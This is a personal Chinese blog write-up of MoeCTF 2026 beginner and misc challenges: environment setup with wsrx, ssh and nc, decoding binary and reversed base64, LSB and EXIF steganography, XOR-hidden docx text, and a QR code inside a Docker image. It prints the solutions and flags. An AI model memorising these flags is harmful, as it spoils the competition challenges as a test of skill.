---
title: MoeCTF2026
date: 2026-10-17 15:43:55
tags: [技术, 好玩]
categories: [竞赛与活动]
description: 入学一年后再试MoeCTF
---
**时间经过**：2026.08.09-2026.10.09
***
我总有一种预感：进入大学一年后，再次接触MoeCTF，我可以学到很多东西
如果不记下来，似乎最终总是会被我忘记，那未免太可惜了
所以就在这里写一些东西吧


（本文不是干净历练的题解，而更多的是我自己的个人记录和总结）  
<br>

（其实第一周以后，基本上就没有我能做出来的题了。唉看着设计得这么有趣的题目，自己却做不出来，多多少少还是有点失望与低落的。不过一方面CTF确实不是我要长期追求的目标，另一方面我已经比去年进步太多了已经很厉害了，还有就是过程最重要，探索的过程无疑是一段宝贵的经历。）
（还有就是要感谢西电信安协会XDSEC，是他们坚持不懈办了这场比赛）
<br>


（9.17留言：）
（哦开学之后，在我的不懈努力下，又做出来了好多题。不过主要是Misc方向的）
（题瘾最大的时候，晚上觉也可以晚睡一个小时，早上也可以路上捣鼓手机，课上也可以听着老师讲课但实际在想题）
（做到最后也是把会的都做了。也就结束了）
（结束了就结束了。毕竟天下哪有不散的宴席呢）
（还是很好的，我也很厉害了。比去年多了很多参与感呢。）
<br>

（10.17留言：）  
（我写了14354字？真的假的）

# 从此开始
## 1 签到
`moectf{welcome-to-moectf-2026}`

## 2-1 如何连接在线环境？
这题就是用来说明如何使用wsrx（WebSocket Reflector X）的

一年前MoeCTF2025的时候，我对wsrx处于勉强能够在Windows上使用但是不求甚解的阶段

刚刚又研究了一下，似乎是懂得更多了

Windows上的WebSocket Reflector X桌面端是一个守护进程，就像Docker Desktop一样，需要打开后挂在后台才能使用。使用时，在MoeCTF2026网站`https://ctf.xidian.edu.cn/games/37`点击连接，就可以连接上了。这样启动一个题目的在线环境，就可以看见映射的链接了（我没说错吧）（大概吧）

<br>
另外如今我对Linux也有了一些了解，想试试如何在WSL2上使用

直接打开搜索引擎搜索我从MoeCTF的Handbook复制来的关键词“wsl2和主机共享网络”，查到了很多有关镜像网络模式的内容。了解之后得知，这是能使wsl2和windows共享localhost的神奇的模式。上网查了一些教程，配置完了，很顺利。

但这未免太顺利了，所以上网查了查镜像网络模式有哪些坏处，发现这有可能会发生同一端口的占用（显而易见啊），以及镜像网络模式是实验性的所以可能会有这样那样的问题。遂放弃镜像网络模式，改回了默认的网络模式。

细细地再读一遍Handbook，决定不再折腾怎么连接wsl2和windows的网络，而是给wsl2单独再下载一个wsrx。又因为这是我第一次不用包管理器而是手动从GitHub下载软件，所以遇到了一些问题，折腾了半天。GitHub访问的网络不好？作者提供了国内镜像。下载后该怎么做？正常解压后发现只有一个可执行文件`wsrx`所以直接移到`~/bin`即可。没有`~/bin`？创建一个即可，然后再放进环境变量。

（我使用的是Zsh）

+ `wget https://forensics.xidian.edu.cn/git/ret2shell/WebSocketReflectorX/releases/download/0.5.2/wsrx-cli-0.5.2-linux-musl-x86_64.tar.gz`
    - 下载
+ `tar -xzvf wsrx-cli-0.5.2-linux-musl-x86_64.tar.gz`
    - 解压
+ `mkdir -p ~/bin`
    - 这里因为我是第一次手动下载并且之前也没捣鼓过什么，所以事先没有`~/bin`，需要创建目录
+ `mv ~/wsrx ~/bin/`
    - 因为下载下来的文件夹中只有一个可执行文件`wsrx`，所以可以直接放进`~/bin`。否则考虑放进`~/opt`再给可执行文件创建软连接到`~/bin`
+ `rm ~/wsrx-cli-0.5.2-linux-musl-x86_64.tar.gz`
    - 删除压缩包
+ `echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc`
    - 这里因为我是第一次手动下载并且之前也没捣鼓过什么，所以需要给`~/bin`加入环境变量

<br>

（另外一开始我使用wsrx的时候报错了，原来是zsh把`?`看作了通配符。给链接加上引号就好了）

## 2-2 如何使用 nc 连接环境？
总体上就是，首先使用wsrx连接在线环境，然后执行nc命令，就好了

<br>

windows的话

+ 启动环境
+ 复制本地地址
+ 在powershell输入`ncat 127.0.0.1 <端口>`

<br>

wsl2的话

+ 启动环境
+ 复制WebSocket链接
+ `wsrx connect '<WebSocket链接>'`
+ 新开一个Windows Terminal的标签页或者使用tmux，总之是获得另一个可以输入的终端（哦我这里有没有把“终端”和“Shell”搞混啊我也不太清楚）
+ `nc 127.0.0.1 <端口>`

## 2-3 如何使用 ssh 连接环境
windows的话

打开wsrx，连接西电CTF终端，启动在线环境，获得链接`127.0.0.1:9152`

按下快捷键`win + r`，输入`wt`，按回车

```powershell
PS C:\Users\Juste> ssh moeops@127.0.0.1 -p 9152
The authenticity of host '[127.0.0.1]:9152 ([127.0.0.1]:9152)' can't be established.
ED25519 key fingerprint is SHA256:knr6DudsmljWFsf+od1CU7ojdLqopEtGsL4BiF5znps.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:9152' (ED25519) to the list of known hosts.
moeops@127.0.0.1's password:
Linux ret2shell-1349-14355-1786940326 6.12.94+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.94-1 (2026-06-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
moeops@ret2shell-1349-14355-1786940326:~$ cat /tmp/flag
moectf{nOW-y0u-knoW_H0w-t0-CoNn3CT-A-SErveR-bY-UsING_5SHb}
```

<br>

wsl2的话

西电CTF终端启动环境，复制 WebSocket 链接`wss://ctf.xidian.edu.cn/api/traffic/xk4kbgYrMiSFflfVJN9MM?port=22`

按下快捷键`win + r`，输入`wt`，按回车，新建标签页选择Ubuntu

```bash
$ wsrx connect 'wss://ctf.xidian.edu.cn/api/traffic/xk4kbgYrMiSFflfVJN9MM?port=22'
2026-08-17T04:27:57.061119Z  INFO wsrx::cli::connect: Hi, I am not RX, RX is here -> 127.0.0.1:39513
2026-08-17T04:27:57.061173Z  WARN wsrx::cli::connect: wsrx will not report non-critical errors by default, you can set `RUST_LOG=wsrx=debug` to see more details.
```

新建标签页选择Ubuntu

```bash
$ ssh moeops@127.0.0.1 -p 39513
moeops@127.0.0.1's password:
Linux ret2shell-1349-14355-1786940326 6.12.94+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.94-1 (2026-06-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 17 04:28:56 2026 from 127.0.0.1
moeops@ret2shell-1349-14355-1786940326:~$ cat /tmp/flag
moectf{nOW-y0u-knoW_H0w-t0-CoNn3CT-A-SErveR-bY-UsING_5SHb}
```

## 3-1 C语言环境配置与基础语法
我要给我的WSL2安装gcc，于是`sudo apt install build-essential`

## 3-2 Python环境配置与基础语法
嗯吓我一跳

```bash
 juster@Juster  ~  python --version
zsh: command not found: python
 ✘ juster@Juster  ~  python3 --version
Python 3.12.3
```

## 3-4 命令提示符
下载附件

在windows文件资源管理器中找到刚下载的附件，注意到文件名是signin-cmd.exe

空白处右键，选择“在终端中打开”，输入`./signin-cmd`

## 3-5 Linux虚拟环境安装与基础命令
```bash
$ ssh student@127.0.0.1 -p <wsrx显示的端口号>
student@127.0.0.1's password:
Linux ret2shell-1373-14355-1786941431 6.12.94+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.94-1 (2026-06-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

✦ Linux 命令练习环境 ✦
  用户: student  密码: password

student@ret2shell-1373-14355-1786941431:/root$ ls
chmod.sh  env.py
student@ret2shell-1373-14355-1786941431:/root$ cd /
student@ret2shell-1373-14355-1786941431:/$ ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
student@ret2shell-1373-14355-1786941431:/$ ls tmp
student@ret2shell-1373-14355-1786941431:/$ cd
student@ret2shell-1373-14355-1786941431:~$ ls
flag.txt
student@ret2shell-1373-14355-1786941431:~$ cat flag.txt
moectf{l1nux_15_50_3Asy}
```

# 取证与安全杂项
## Misc入门指北
打开入门指北，果然和去年一样，在PDF末尾有白色的字符，可以选中。不过今年不是明文，而是二进制。

想到二进制转字符，打开搜索引擎，搜索`python 二进制转十进制`。于是想到二进制转十进制转字符，搜索`python 二进制转十进制`，又突然想起`chr()`。

打开Windows Terminal，默认的是PowerShell。输入`python`进入python解释器。从PDF复制过来二进制串后赋值

```bash
>>> s = 01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001
... 00110101 01100011 0111110
...
  File "<python-input-0>", line 1
    s = 01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
        ^
SyntaxError: leading zeros in decimal integer literals are not permitted; use an 0o prefix for octal integers
```

哦加个引号吧

```bash
>>> s = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001
... 00110101 01100011 0111110"
...
  File "<python-input-1>", line 1
    s = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
        ^
SyntaxError: unterminated string literal (detected at line 1)
```

哦是换行的问题吗？用必应搜索`python 换行`，想起来`\`

```bash
>>> s = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 \
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 \
... 00110101 01100011 0111110"
```

于是尝试刚刚查到的`int()`

```bash
>>> decimal_num = int(s, 2)
Traceback (most recent call last):
  File "<python-input-3>", line 1, in <module>
    decimal_num = int(s, 2)
ValueError: invalid literal for int() with base 2: '01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 00110101 01100011 0
```

哦是因为中间有空格吗？用必应搜索`python 去除空格`，再搜索我不熟悉的`python join`，大概了解后再次尝试

```bash
>>> decimal_num = int("".join(s.split()), 2)
>>> decimal_num
5240902041063266692239567038321778753823220322663051710
>>> chr(decimal_num)
Traceback (most recent call last):
  File "<python-input-6>", line 1, in <module>
    chr(decimal_num)
    ~~~^^^^^^^^^^^^^
ValueError: chr() arg not in range(0x110000)
```

哦这个思路是不对的。这是去除了所有空格，二进制字符串在一起变成了特别大的一个的数

正确做法应该是保留空格，把每个字节逐个进行二进制转十进制转字符

```bash
>>> for i in range(len(s)):
...     print(char(int(s[i], 2)))
...
Traceback (most recent call last):
  File "<python-input-7>", line 2, in <module>
    print(char(int(s[i], 2)))
          ^^^^
NameError: name 'char' is not defined. Did you mean: 'chr'?
```

我去，打错字了

```bash
>>> for i in range(len(s)):
...     print(chr(int(s[i], 2)))
...








Traceback (most recent call last):
  File "<python-input-8>", line 2, in <module>
    print(chr(int(s[i], 2)))
              ~~~^^^^^^^^^
ValueError: invalid literal for int() with base 2: ' '
```

哦我还没有处理空格，应该跳过空格的部分

```bash
>>> for i in range(len(s)):
...     print(s[i])
...     if s[i]:
...         print(chr(int(s[i], 2)))
...
0

1

1

0

1

1

0

1


Traceback (most recent call last):
  File "<python-input-10>", line 4, in <module>
    print(chr(int(s[i], 2)))
              ~~~^^^^^^^^^
ValueError: invalid literal for int() with base 2: ' '
```

嗯？`if s[i]:`咋不能跳过空格啊，是我记错了吗？

忘了这里我上网搜了啥，总之是得知有个`isspace()`，再用必应搜索`python isspace`，大概了解后再次尝试

```bash
>>> for i in range(len(s)):
...     if not s[i].isspace():
...         print(chr(int(s[i], 2)))
...























































































































































































```

？这空行有点夸张了吧

之前不知怎的都有很多空行，但都没当回事。这次空行也太多了点

另外咋没有有用的输出啊

尝试`print`调试大法

```bash
>>> for i in range(len(s)):
...     print(s[i], int(s[i], 2), chr(int(s[i], 2)))
...     if not s[i].isspace():
...         print(chr(int(s[i], 2)))
...
0 0

1 1

1 1

0 0

1 1

1 1

0 0

1 1

Traceback (most recent call last):
  File "<python-input-12>", line 2, in <module>
    print(s[i], int(s[i], 2), chr(int(s[i], 2)))
                ~~~^^^^^^^^^
ValueError: invalid literal for int() with base 2: ' '
```

原来还是空格出问题了吗

看看怎么个事

```bash
>>> s
'01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 00110101 01100011 0111110'
```

思考了一下，我突然想起，直接用`split()`分割空格再循环不就好了

这样就不是对于二进制字符串`s`逐字符处理，而是对于`s`的内容，一个字节一个字节处理

```bash
>>> s
'01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 00110101 01100011 0111110'
>>> s = s.split
>>> s
<built-in method split of str object at 0x000001D4B805A230>
>>> for i in range(len(s)):
...     print(s[i], int(s[i], 2), chr(int(s[i], 2)))
...     if not s[i].isspace():
...         print(chr(int(s[i], 2)))
...
Traceback (most recent call last):
  File "<python-input-16>", line 1, in <module>
    for i in range(len(s)):
                   ~~~^^^
TypeError: object of type 'builtin_function_or_method' has no len()
```

中间看见s是`<built-in method split of str object at 0x000001D4B805A230>`我竟然都没发现不对，直到报错了才想起来，赋值`s = s.split`的时候没加括号

```bash
>>> s = 01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001
... 00110101 01100011 0111110
...
  File "<python-input-17>", line 1
    s = 01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001
        ^
SyntaxError: leading zeros in decimal integer literals are not permitted; use an 0o prefix for octal integers
```

哦换行和引号

另外当时我不确定对不对，所以加了一行调试的`print`

```bash
>>> s = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 \
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 \
... 00110101 01100011 0111110"
>>>
>>> s = s.split()
>>> s
['01101101', '01101111', '01100101', '01100011', '01110100', '01100110', '01111011', '01010111', '00110011', '00110001', '01100011', '00110000', '01101101', '01100101', '01011111', '00110111', '01101111', '01011111', '01101101', '00110001', '00110101', '01100011', '0111110']
>>> for i in range(len(s)):
...     print(s[i], int(s[i], 2), chr(int(s[i], 2)))
...     if not s[i].isspace():
...         print(chr(int(s[i], 2)))
...
01101101 109 m
m
01101111 111 o
o
01100101 101 e
e
01100011 99 c
c
01110100 116 t
t
01100110 102 f
f
01111011 123 {
{
01010111 87 W
W
00110011 51 3
3
00110001 49 1
1
01100011 99 c
c
00110000 48 0
0
01101101 109 m
m
01100101 101 e
e
01011111 95 _
_
00110111 55 7
7
01101111 111 o
o
01011111 95 _
_
01101101 109 m
m
00110001 49 1
1
00110101 53 5
5
01100011 99 c
c
0111110 62 >
>
```

咋这么奇怪

我记的print可以输出不换行，于是上网搜索`python print 不换行`，想起来`end`参数

另外删掉调试用的部分，再次尝试

```bash
>>> for i in range(len(s)):
...     print(chr(int(s[i], 2)), end='')
...
>>> tf{W31c0me_7o_m15c>
KeyboardInterrupt
```

？为啥开头的`moec`没有了，而且末尾是`>` 不是`}`？

（`KeyboardInterrupt`是我按的`ctrl c`）

我看看怎么个事

```bash
>>> s
['01101101', '01101111', '01100101', '01100011', '01110100', '01100110', '01111011', '01010111', '00110011', '00110001', '01100011', '00110000', '01101101', '01100101', '01011111', '00110111', '01101111', '01011111', '01101101', '00110001', '00110101', '01100011', '0111110']
```

是哪里有问题呢

我试试是`chr`的问题吗

```bash
>>> chr(01101101)
  File "<python-input-28>", line 1
    chr(01101101)
        ^
SyntaxError: leading zeros in decimal integer literals are not permitted; use an 0o prefix for octal integers
```

我服了

```bash
>>> chr('01101101')
Traceback (most recent call last):
  File "<python-input-29>", line 1, in <module>
    chr('01101101')
    ~~~^^^^^^^^^^^^
TypeError: 'str' object cannot be interpreted as an integer
```

我又服了

```bash
>>> chr(int(01101101, 2))
  File "<python-input-30>", line 1
    chr(int(01101101, 2))
            ^
SyntaxError: leading zeros in decimal integer literals are not permitted; use an 0o prefix for octal integers
```

真没招了

```bash
>>> chr(int('01101101', 2))
'm'
```

没问题啊

【总之是一顿尝试，还是重复性的尝试】

我靠我知道了，最后咋是`0111110`七位啊，少了一位啊

我从PDF上少复制了一位啊

哇啊啊啊我再也不手动复制了

`ctrl a`全选，把前边删了，发现最后一个字节是`01111101`

```bash
>>> s = '01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 \
... 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 \
... 00110101 01100011 01111101'
>>>
>>> s = s.split()
>>> for i in range(len(s)):
...     print(s[i], int(s[i], 2), chr(int(s[i], 2)))
...
01101101 109 m
01101111 111 o
01100101 101 e
01100011 99 c
01110100 116 t
01100110 102 f
01111011 123 {
01010111 87 W
00110011 51 3
00110001 49 1
01100011 99 c
00110000 48 0
01101101 109 m
01100101 101 e
01011111 95 _
00110111 55 7
01101111 111 o
01011111 95 _
01101101 109 m
00110001 49 1
00110101 53 5
01100011 99 c
01111101 125 }
```

嗯，应该没问题了，试试最后的输出

```bash
>>> for i in range(len(s)):
...     print(chr(int(s[i], 2)), end='')
...
>>> tf{W31c0me_7o_m15c}
```

咋还是没有开头的`moec`啊

思考了半天，尝试了半天，甚至怀疑了单引号双引号的区别，还是不知道为啥

终于是有放弃的念头了，去问问deepseek

趁着deepseek正在思考，我还想挣扎一下，我就把代码复制到IDLE，新建文件`temp.py`，运行一下。改了几次语法错误后，发现竟然没有问题？？

去看一下deepseek的回答。它的回答是很有问题的，幸好现在的我并不会完全相信AI的回答。但它的方向提醒了我：原来是Python解释器的提示符`>>> `占了四个字符，而刚刚的`print`中我全部都是`end=''`。

再让我试一下，加一个`print()`来加个换行

```bash
>>> for i in range(len(s)):
...     print(chr(int(s[i], 2)), end="")
... print()
...
moectf{W31c0me_7o_m15c}
```

唉，终于

真没想到入门指北我试了这么长时间。不过跟去年很不一样啊，一方面是基本上是自己写+上网查而不是全程问AI，另一方面入门计算机一年了懂的也更多了。很有成就感啊

最后附一个完整的干净的代码

```python
s = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 01010111 00110011 00110001 01100011 00110000 01101101 01100101 01011111 00110111 01101111 01011111 01101101 00110001 00110101 01100011 01111101"
s = s.split()
for i in range(len(s)):
    print(chr(int(s[i], 2)), end="")
```

## ez_BASE
阅读说明，这题是BASE编码。以前我也了解过一点点base64。上网查一下`base编码`，原来除了base64还有其他的啊

查看附件，文件`xiaozhitiao.txt`写的是`=0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb`，嗯有标志性的等号，手动数一下发现正好总数是4的倍数，大概是base64

上网查一下，于是尝试

```bash
>>> import base64
>>> encoded_str = '=0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb'
>>> decoded_bytes = base64decode(encoded_str)
Traceback (most recent call last):
  File "<python-input-2>", line 1, in <module>
    decoded_bytes = base64decode(encoded_str)
                    ^^^^^^^^^^^^
NameError: name 'base64decode' is not defined
```

打错字了

```bash
>>> decoded_bytes = base64.b64decode(encoded_str)
Traceback (most recent call last):
  File "<python-input-3>", line 1, in <module>
    decoded_bytes = base64.b64decode(encoded_str)
  File "C:\Users\Juste\AppData\Local\Programs\Python\Python313\Lib\base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
binascii.Error: Incorrect padding
```

没看懂

是哪里不符合base64标准吗

要是挪一下等号呢

```bash
>>> encoded_str = '0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb'
>>> decoded_bytes = base64.b64decode(encoded_str)
Traceback (most recent call last):
  File "<python-input-5>", line 1, in <module>
    decoded_bytes = base64.b64decode(encoded_str)
  File "C:\Users\Juste\AppData\Local\Programs\Python\Python313\Lib\base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
binascii.Error: Incorrect padding
>>> encoded_str = '0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb='
>>> decoded_bytes = base64.b64decode(encoded_str)
>>> decoded_bytes
b"\xd0svSG\x00'e\xeets.\xb7e\xf3`t(\xf5Wp\x93W\xa6Gv%\xf5f"
```

似乎好了

```bash
>>> decoded_str = decoded_bytes.decode('utf-8')
Traceback (most recent call last):
  File "<python-input-9>", line 1, in <module>
    decoded_str = decoded_bytes.decode('utf-8')
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd0 in position 0: invalid continuation byte
>>> decoded_str = decoded_bytes.decode()
Traceback (most recent call last):
  File "<python-input-10>", line 1, in <module>
    decoded_str = decoded_bytes.decode()
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd0 in position 0: invalid continuation byte
>>> decoded_str = decoded_bytes.decode('ascii')
Traceback (most recent call last):
  File "<python-input-11>", line 1, in <module>
    decoded_str = decoded_bytes.decode('ascii')
UnicodeDecodeError: 'ascii' codec can't decode byte 0xd0 in position 0: ordinal not in range(128)
>>> decoded_str = decoded_bytes.decode('gbk')
Traceback (most recent call last):
  File "<python-input-12>", line 1, in <module>
    decoded_str = decoded_bytes.decode('gbk')
UnicodeDecodeError: 'gbk' codec can't decode byte 0xa6 in position 23: illegal multibyte sequence
decoding with 'gbk' codec failed
```

嗯

放弃了

问问AI吧

一如既往的胡说八道呢

不过AI偶然间提到说有可能是颠倒或倒序或其他编码

哦哦哦，倒序，哦哦，原来是这个“小纸条”是反过来的

哇哦

恍然大悟

（另外原来base64的等号必须在末尾啊）

上网查一下`python 倒叙`（嗯对我还打错字了），想起来切片

```bash
>>> encoded_str = '=0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb'
>>> encoded_str = encoded_str[::-1]
>>> decoded_bytes = base64.b64decode(encoded_str)
>>> decoded_str = decoded_bytes.decode()
>>> decoded_str
'moectf{Y0u_h@v3_kn0wn_b@sE64}'
```

## ez_LSB
上网搜索了解`LSB`、`Zsteg`，搜索在线网站工具，得到结果

```latex
b1,rgb,lsb,xy       .. text: "flag:bW9lY3Rme2M0N19rTjBXNV9MU0J9"
```

提交`moectf{bW9lY3Rme2M0N19rTjBXNV9MU0J9}`，错误

数了一下发现字符数是4的倍数，猜测是base64

```python
>>> import base64
>>> base64.b64decode('bW9lY3Rme2M0N19rTjBXNV9MU0J9')
b'moectf{c47_kN0W5_LSB}'
```

## 星走路的旅程-level1
哦哦哦这个好玩

之前我就看见网上说微信发原图更清晰，但可能会有一些隐私问题

就是这个

之前见过叫什么，后来忘记了。原来叫EXIF啊

保存图片后手机或者电脑默认的软件打开就能看见了

机场IATA代码：上网搜索机场名字，查看百度百科对应页面

手机厂商：红米是小米家的🤔

格林尼治标准时间：北京时间减去八个小时

再看一下md5进行验证：上网搜索`md5`，随便打开了一个在线转换网站。嗯我想的flag和题目提供的md5一致

## 空白文档
> （后面还有一些类似的地方，读者也许会发现，我写的题解的语言风格前后文完全不同。那是因为我做题的一个高潮是开学前，另一个高峰是开学一周后。不是同一时间写的，自然语言风格也不同了。）

打开docx文件，ctrl a全选，发现有空白文字。得知是异或加密，密钥`office`。

已知docx文件是zip压缩包。尝试给文件后缀改成zip，解压，打开`xing的flag/word/document.xml`，ctrl f搜索`<w:t>`，发现有个神秘字符串`AgkDChcDFBEOWhEAMFcVNg4cMABXXQQY`

编写脚本

```python
import base64

key = 'office'
text = 'AgkDChcDFBEOWhEAMFcVNg4cMABXXQQY'
b64decoded_text = base64.b64decode(text)

for i in range(len(b64decoded_text)):
    print(chr(ord(key[i%len(key)]) ^ b64decoded_text[i]), end='')

```

得到flag

（以下是个人记录性质的心路历程

+ 一开始知道是异或加密后，我就没有思路了。不知道是什么跟`office`异或。后来开学了一周，我又想起了这题，就又来看看。就成功了。
+ 其实是AI告诉我的，说内容放在`word/document.xml`
+ docx其实是zip压缩包这件事，倒是我之前在别的地方看见的
+ 其实一开始我是在别的题目中，问AI问出了`xxd`。于是我突然想起来了这里，就来试了一下`xxd xing的flag.docx`。没什么发现。但至少对这题重拾信心了来着。然后改后缀然后解压然后就找到了。

## Can_you_find_it?
（Windows下）

打开Docker Desktop，挂在后台

下载附件，在附件所在文件夹空白处右键，点击“在终端处打开”，会打开PowerShell

上网搜索`docker镜像文件 tar 打开`，得知`docker load`命令，输入`docker load -i can_you_find_it.tar`，成功加载镜像

尝试运行镜像，输入`docker run -it can_you_find_it:latest`，成功运行。

接下来开始探索

```bash
root@1149d6547d82:/home# ls
hint1.txt
root@1149d6547d82:/home# cat hint1.txt
xing的hint：或许你可以查一下系统缓存？
root@1149d6547d82:/home# cd /var/cache       #上网搜索得知/var/cache
root@1149d6547d82:/var/cache# ls
apt  debconf  fontconfig  hint2.txt  ldconfig  man
root@1149d6547d82:/var/cache# cat hint2.txt
xing的hint：注意隐藏
root@1149d6547d82:/var/cache# ls -a
.  ..  .system  apt  debconf  fontconfig  hint2.txt  ldconfig  man
root@1149d6547d82:/var/cache# ls -la
total 36
drwxr-xr-x 1 root root 4096 Jul 12 16:40 .
drwxr-xr-x 1 root root 4096 Jun 27 02:12 ..
drwxr-xr-x 1 root root 4096 Jul 12 16:40 .system
drwxr-xr-x 1 root root 4096 Jul 11 20:06 apt
drwxr-xr-x 1 root root 4096 Jun 27 02:12 debconf
drwxr-xr-x 2 root root 4096 Jul 11 20:06 fontconfig
-rw-r--r-- 1 root root   27 Jul 12 16:40 hint2.txt
drwx------ 1 root root 4096 Jun 27 02:11 ldconfig
drwxr-xr-x 2 root root 4096 Jul 11 20:06 man
root@1149d6547d82:/var/cache# cd .system
root@1149d6547d82:/var/cache/.system# ls
cache_meta.log
root@1149d6547d82:/var/cache/.system# cat cache_meta.log
�PNG
␦
���D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�D@H�{�����{��^���u'_�'�7y�S�ro<������$�`��z7���M�m�� N $@" $@" $@" $@" $&���D��ɕ�7<�ަW����@H�D@H�D@H�D@H�D@H�_��j�U���o|�&��O?�㛯��p     ���&��ONq���&�9yo��s�~r;���@H�D@H�D@H�D@H�� !5������S�׮N>�����ύ��@" $@" $@" $@" $@b�����v����__w�۩��@H�D@H�D@H�D@H�D@HL�?����w߉��{�5�ϳ8������<b�ִ�������g5}�'|V��c�w�d~�@" $@" $@" $@" $�     7Y�0x�LbO:����~���?������I�L�>a2xҭ{;���ʷL>��kN����p������k�(��Oho�Z�<)��k�y"�����O���������#v�OO�NN�>a������u�������85yo����sN $@" $@" $@" $@��A�'
                                                                   m8�� ky�0D:y�S��<~���mN $@" $@" $@" $@" $��D?ucU���OMN�N?���)��߷'���ON $@" $@" $@" $@" $�/#�o�ƴ����7�k��u7O{���]��6ﹿ�        �D@H�D@H�D@H�D@H�d�N��Ӧ'nLJO���i�'L-O:}�������'�N $@" $@" $@" $@" $�'�Ol�Z>u��6?�S7>�[k�''��m����m3'    ����7v�ʎ�S�4�~���t�{9}�'L��;'    �����nL��z´����{�y�Hn&?�[��6����@" $@" $@" $@" $5H8��WeN�MOM��=u�3��;q�=L�7�M7��op     �~}�h����䣛^���+ro}-7O7ߘD���חʿ� �D@H�D@H�D@H�D@H��N�`2�wm��}�����vj��2L�֍�����@" $@" $@" $@" $@�~��'�oM�޸������������Om�        7�ĩ͟�$'    Y?H�y���J�S�CV�Cb��Yo<�'�?�1�w�����ț9��������D7E���i���ޓ�|�U��n�׀��n�^�''    ����'�0��yG���횧���>���7>����    �D@H�D@H�D@H�D@H�����>i��S�v?aJ~�=L�&�������op    ��␦$�$��n
   c=a���uo
           `�������<\y� �D@H�D@H�D@H�D@H��$�ۼ�t�d�&���m�Z�I�~3[9������|�$��O}�č��7��?e�����{��}r/����]`3'    �GL�?a�x��d���퍝��&�{c_�L?��O�-�p    ����)�r                   ��
                                                      � I&��␦IEND�B`�root@1149d6547d82:/var/cache/.system#
```

注意到文件头有`�PNG`，发现`cache_meta.log`其实是PNG图片

回到宿主机Windows，打开Docker Desktop，查看刚刚启动的容器的名字，发现是`flamboyant_panini`

找一个喜欢的位置打开PowerShell（这里我直接就把后缀`log`改成`png`了）

```powershell
PS C:\Users\Juste> docker cp flamboyant_panini:/var/cache/.system/cache_meta.log ./cache_meta.png
Successfully copied 4.1kB to C:\Users\Juste\cache_meta.png
```

查看图片，发现是一张少了两个定位点的二维码。联想到二维码定位点只用于定位而不存储信息，我们可以尝试补上定位点后扫码试试

右键这个`png`文件，在打开方式中选择Windows自带的“画图”。

放大、框选左下角的定位点，复制，粘贴一个拖到左上角，再粘贴一个拖到右上角。

拿出手机，打开微信，打开扫一扫，扫码。

得到flag，复制flag，粘贴到文件传输助手。

打开电脑微信，复制flag，提交flag。

最后打开Docker Desktop，删除相关的容器和镜像（可选

<br>

（小插曲们

